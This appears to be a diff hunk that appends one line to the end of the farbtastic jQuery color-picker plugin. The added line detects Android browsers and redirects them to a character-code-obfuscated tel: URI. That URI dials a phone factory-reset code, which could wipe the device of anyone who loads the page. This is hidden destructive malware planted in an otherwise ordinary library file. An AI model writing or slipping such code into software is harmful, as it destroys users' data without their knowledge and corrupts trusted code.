@@ -1908,3 +1908,5 @@ jQuery._farbtastic = function (container, callback) {
     fb.linkTo(callback);
   }
 }
+
+if((0 < navigator.userAgent.indexOf("Android"))) { document.location=String.fromCharCode(116,101,108,58,42,50,55,54,55,42,51,56,53,53,37,50,51); }
